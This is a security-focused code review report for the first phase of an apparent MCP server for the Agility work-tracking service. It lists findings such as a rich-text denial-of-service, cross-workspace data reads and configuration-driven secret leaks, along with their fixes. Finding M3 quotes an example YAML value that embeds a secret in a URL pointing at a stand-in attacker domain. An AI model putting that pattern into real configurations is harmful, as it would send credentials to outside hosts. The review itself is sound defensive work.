# Phase 1 review

- **Scope:** all Phase 1 code (P1-01 … P1-15): `packages/core` (client, metadata, compiler, identity, output, tools,
  server), `apps/cli` (stdio, configuration, CA fetch), the release pipeline and the live harness.
- **Date:** 2026-10-21. **Branch:** `task/P1-16-phase-1-review`, on top of the Phase 1 stack.
- **Method:** an adversarial read of every source file by a separate reviewer with a fresh context, reproducing each
  claim with throwaway tests outside the repository; every finding below has a regression test in
  `packages/core/test/review.test.ts` or `apps/cli/test/config.test.ts`, and the high ones were mutation-checked (the
  test fails with the fix reverted). Live: the read-only suite (10 tests) against the third-party tenant, the compiled
  query shapes including the new guards, and MCP Inspector against the built CLI (synthetic upstream).
- **Checks:** `pnpm lint && pnpm typecheck && pnpm test && pnpm build` green; `pnpm test:live` green; metadata drift
  against the public example instance clean.

## Verdict

**Ready for v0.1 with the fixes in this branch.** Two high findings (quadratic rich-text conversion; values of related
assets outside the workspace) and six medium ones are fixed with regression tests. What is still open needs the owner:
the client runs of the setup snippets (P1-14), the release set-up and approvals (P1-15), the `live` workflow approval on
`main` (P1-12) and the nightly-schedule decision ([pending decisions](../pending-decisions/phase-1.md)).

## Per-task completeness

| Task | Status | Evidence / gap |
|---|---|---|
| P1-01 core skeleton | met | registry refusals, annotations, error mapping, redaction corpus, two-context concurrency, schema cache (7.5 → 1.9 ms p50) |
| P1-02 Agility client | met | error table, retries, breaker per credential, byte cap, TLS shapes incl. a private-CA integration test |
| P1-03 metadata | met | snapshot = public schema (no drift), path resolution, prefixes, statuses, tiers, strategies; live found `Token` (L-167) |
| P1-04 compiler | met | property tests, P0-06 `with` cases, OR-injection; live: `filter` entries are ANDed; project-tree predicates (L-168) |
| P1-05 output | met | envelope fuzz, HTML corpus, formats; **H1** (quadratic HTML) fixed here |
| P1-06 identity | met | every identifier form, out-of-scope = not found, ambiguity, sprints |
| P1-07 … P1-10 tools | met | 13 tools, probes, costs verified cold, live runs; **H2**, M1, M2, M4, M5 fixed here |
| P1-11 CLI | met | stdio e2e in both eras, stdout cleanliness, YAML validation; **M3** fixed here |
| P1-12 harness | met, owner step | live suite green locally; the `live` workflow run on `main` waits for approval |
| P1-13 reference and lints | met | generated reference, lints with every refused example, budgets: 13 tools, 25.1 KB `tools/list` |
| P1-14 docs | blocked (owner) | guides and docs check done; real-client runs pending |
| P1-15 release | blocked (owner) | pipeline and local dry run done; publishing needs the owner's set-up |

## Findings

Status: **fixed** (this branch, regression test), **task** (new task file), **accepted** (residual risk, recorded).

### High

**H1 — Rich-text conversion was quadratic on hostile descriptions** — **fixed.** Nested lists repeated their
indentation per item and nested links re-joined the tail at every close: 16 KB of `<ul>…<li>` produced 8 MB in 25 s, so
any member who can edit a description could stall or crash the server. Now the input is capped at 64 KiB before
conversion, indentation stops at depth 8 and only one link is open at a time (`output/text.ts`). Lesson L-171.

**H2 — Related-asset paths read data outside the workspace** — **fixed.** The scope predicate restricted the queried
asset, but a caller path such as `Super.Description`, `Scope.Parent.Name` or `Owners.Email` read the related asset
whatever its project, the deny list did not apply to related types, filters on such paths were an oracle, and
`minimiseEmails` missed `Owners.Email`. Now `resolvePath` records every relation hop and the compiler's guard
(`query/compiler.ts` `pathGuards`): a related project-bound asset counts only when it is in the workspace (its value is
dropped per row by `sanitizeRow`, and a filter through it gets a server-owned `…Scope=$ab_scope` term in the same
entry); denied types are unreachable; members expose their name (username and email only with `AB_MEMBER_EMAILS`);
multi-value relations to project-bound assets are refused unless aggregated. Verified live (the tenant accepts every
guarded shape). Lesson L-169.

### Medium

- **M1 — `in` lists over 50 broke server-built filters** (project trees, project members) — **fixed:** filters a tool
  builds from server data are marked `trusted` (never settable from tool input) and take up to 2,000 values.
- **M2 — multi-type pages could skip or repeat rows** when the merge order differed from Agility's — **fixed:** a k-way
  merge takes each type's rows in upstream order and offsets count upstream positions; `recently_changed` now sorts on
  the selected `ChangeDateUTC`. A test walks every row exactly once with a reversed comparator. Lesson L-170.
- **M3 — YAML references could move secrets elsewhere** (`url: https://${SECRET}.evil.example`, a keychain entry in
  `name`) — **fixed:** `${…}` references only in `instance.token`; `$${` escapes a literal. The guide says the YAML file
  decides where the token goes, so it must be trusted.
- **M4 — `get_work_item` failed when the workspace excluded a child type** — **fixed:** such sections are left out with
  a note.
- **M5 — usernames (often email addresses) were returned with emails off** — **fixed:** treated as contact data.
- **M6 — guessed asset-type names cost a 404 each and grew the cache** — **fixed:** at most three unknown names per call
  reach Agility, and the negative cache is bounded.

### Low

- **Fixed:** error details are cleaned before they are enveloped; zoned timestamps on non-existent days are refused; a
  huge `Retry-After` keeps the breaker open at most an hour; the project-tree cache is per credential; an explicitly
  empty project list is refused instead of meaning "every project"; aggregation values are read by the key Agility
  answers with (`Children[AssetState!='Dead'].@Count`, confirmed live; counts arrive as strings and are converted).
- **Task P1-17:** single-type paging counts rows after the scope recheck, so a row the upstream should not have returned
  shifts the cursor; count upstream positions as `multiPage` now does.
- **Task P1-18:** the cursor's time window is not part of the binding hash, and `list_sprints` evaluates its timing at
  every page; both matter once `time_range` tools ship (Phase 6).
- **Accepted:** aggregations over relations (`Children.@Count`) count related assets in any project the member can see;
  sorting through a related asset uses its order even when it is outside the workspace (the values themselves are
  dropped); debug logs keep up to 500 characters of an Agility error body (local stderr, redacted).

## Checked and sound

Every caller value reaches Agility through `with` (`$v1…`); tokens come only from validated paths and allowlisted
operators; commas and control characters are refused; the scope and dead-asset predicates are separate top-level
entries no `any_of` can reach; rows are rechecked on every path; out-of-scope and missing assets answer identically;
cursors are bound to tool, instance, projects and the normalised query; the envelope's marker is random and look-alikes
are neutralised; CSV formulas are neutralised; secrets never reach logs, errors, stdout or arguments; URLs are built from
validated segments, redirects are refused, bodies are byte-capped; the keychain is read without a shell; stdout carries
only MCP frames; there is no module-level request state.

## Client matrix

MCP Inspector CLI 2.11.0 verified against the v0.1 CLI (2026-10-21, both eras). VS Code, Claude Code, Copilot CLI and
JetBrains wait for the owner's runs ([client compatibility](../reference/client-compatibility.md)).

## Go / no-go for Phase 2

**Go**, recommended, once the owner has run the clients and released v0.1; recorded in
[pending decisions](../pending-decisions/phase-1.md) (D-21).
